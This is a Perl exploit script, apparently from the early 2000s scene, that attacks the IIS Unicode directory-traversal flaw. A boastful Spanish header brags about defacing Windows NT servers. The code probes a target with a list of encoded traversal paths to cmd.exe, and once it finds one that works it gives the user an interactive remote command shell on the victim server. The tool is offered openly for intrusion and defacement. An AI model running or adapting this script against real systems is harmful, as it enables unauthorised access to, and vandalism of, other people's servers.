#!/usr/bin/perl
use IO::Socket;
###########FUNNY CODDING##########
# Author: Dr_Cluster
# hoO0 es un martes... no fui a al jardin porque cayo granizo y se rompio el 
# techo de chapa. creo que una teta de monja seria mas servible que yo
# es aqui cuando empieso  mirar el cenizero de mi papi y trato de armarme
# una motoneta en la que sentinelli me lleve todos los domingos a la calesita.
# pero se que eso es imposible... sentinelli anda en su sentimovil a las chapas
# y no se va a rebajar a una motoneta.. aunque.. salvo que lo amenaze nahuel
# mutti..  pero ese ya es otro tema..
# llego el momento de la depresion, faltan 6 HORAS! para que empiese 
# elhacker2001 no aguanto mas.. aca es cuando me yega a la cabeza programar ...
# pero que programo?? se programar? (carl33n help me) recuerdo que hace tiempo
# hice el cracker de ftp mas rapido e inovador de la historia que fue 
# rapidamente criticado por un individuo (yo no le hago caso es un lammer) que
# no recuerdo su nombre. Sin dudarlo me pongo a programar en perl un script 
# (para demostrarle mi sobrecomunal capacidad de hacer gotos a este pibe 
# cantina) que podra ayudar a la comuna hacker... y que algo mejor que ayude a
# defacear nt's? hago click en la carpetita de arriba Mis Documentos y me fijo 
# si hay algun bug del iis... no encontre ninguno.
# pero estoy decidido y no puedo rebajarme a abandonar el proyecto .Entro por 
# primera vez a securitifoco.com y busco algun bug... usando el poder del mouse
# beo por alla avajo un .jif que decia "Unicode", me bajo un programita y 
# empieso a mirarlo.. vla vla bla.. la cosa el que hagarre el word y empese a
# cutipastear todo en un archivo y cambiarle el copyright (sin que se de cuenta
# el duenio, hay que ser ilegal para ser hacker). 
# aca es cuando llega una ola de defacement de parte mia y empieso a saber para
# que sirve el <title> de html. sin dudas amigos espero que los disfruten
# pd: a todos los que no les gusta me chupam un hguevo
# pd2: perdonen la faltras de orografia es que mi maestra de sala verde todavia
# no me ensenio la regla de los signos (?)
# gracias a mis colegas por el shellcode del unicode :X
# root@orgasmotor:~/exploits# date
# Tue Feb 31 25:13:02 /etc/localtime 2005
# Increible pero REALLLLL!!!!!!!
######################
$Rojo="\033[1;31m";
$Default="\033[0;39m";
$Verde="\033[1;32m";
$Azul="\033[1;34m";
######################
unless ($ARGV[0]){ die "$Rojo\Try $0 <host>\nProgramado por [dr_cluster] askclustin\@hackersdent.org$Default\n";}
@test=(
"/scripts/.%252e/.%252e/winnt/system32/cmd.exe?/c",
"/scripts/..%c0%af../winnt/system32/cmd.exe?/c",
"/scripts/cgi-bin/..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c",
"/..%c0%af../winnt/system32/cmd.exe?/c",
"/msadc/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c",
"/msadc/.%252e/.%252e/.%252e/.%252e/.%252e//winnt/system32/cmd.exe?/c",
"/cgi-bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c",
"/samples/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c",
"/iisadmpwd/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c",
"/iisadmpwd/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/winnt/system32/cmd.exe?/c",
"/_vti_cnf/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c",
"/_vti_bin/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/winnt/system32/cmd.exe?/c",
"/_vti_bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c",
"/adsamples/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c");
$server= $ARGV[0];
print "$Verde %%Unicode $Default|| $Rojo\Scanner%%\n";
print "$Azul\Programado por [dr_cluster] askclustin\@hackersdent.org$Default\n\n";
print "$Rojo\[1] Connecting to $ARGV[0]..$Default\n";
$S=IO::Socket::INET->new(PeerAddr => $server,PeerPort => 80,Proto=>"tcp",Type=> SOCK_STREAM) or die "$Rojo\[#] Can't connect to $ARGV[0]$Default\n";
print "$Rojo\[!] Succefully connected to $ARGV[0]$Default\n";
print "$Rojo\[2] Founding bug... $Default\n";
foreach $cumbiancha(@test){
@res=raw("GET $cumbiancha+dir HTTP/1.0\r\n\r\n");
print "$Verde$cumbiancha$Default\n";
foreach $l (@res){
if($l=~ /200 OK/){
    print "bug found on $server\n";
    print "at $Azul$cumbiancha$Default url\n";
    print "$Rojo\[3] Entering unicodeSH ;)... $Default\n";
    sleep(1);
    $theunicode=$cumbiancha;
    goto sh;}}
}
die "$Rojo\[#] Unicode not found\nProgramado por [dr_cluster] askclustin\@hackersdent.org$Default\n";
sh:
while(1){
print "$Azul\[unicode\@$server] $Verde>>$Default ";
while(<STDIN>) {
$send=$_;last; }
$send=~ s/ /+/g ;
alarm(20);
@res=raw("GET $theunicode+$send HTTP/1.0 \n\r\n\r");
alarm(0);
print "@res\n";
}
sub raw{
use IO::Socket;
 my ($pstr)=@_;
$S=IO::Socket::INET->new(PeerAddr => $server,PeerPort => 80,Proto=>"tcp",Type=> SOCK_STREAM);
  my @in="";
  select($S); $|=1; print $pstr;
  while(<$S>) {
   push @in,$_; last if ($line=~ /^[\r\n]+$/ );}
  select(STDOUT); return @in;
 }
# END OF FUNNY CODDING
# CARLIIIIINN CARLIIIN !!! HACK THE PLANET!!!!!!
#
#--[Powerslave] buuuuu el de CA0S es mas funny code